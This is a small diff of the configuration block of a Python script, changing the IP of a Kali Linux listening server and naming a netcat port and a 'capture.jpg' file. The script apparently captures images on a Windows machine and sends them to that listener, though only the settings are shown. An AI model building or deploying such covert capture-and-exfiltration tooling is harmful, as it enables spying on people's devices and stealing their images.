@@ -6,7 +6,7 @@ import time
 import os
 
 # ------------------ Configuration ------------------
-KALI_IP = "192.168.1.104"           # ←←← Your Kali Linux / listening server IP
+KALI_IP = "192.168.28.128"           # ←←← Your Kali Linux / listening server IP
 PORT = 9999                         # Port where netcat / server is listening
 ALSO_SAVE_ON_WINDOWS = False        # Set True only for local testing
 CAPTURE_FILENAME = "capture.jpg"
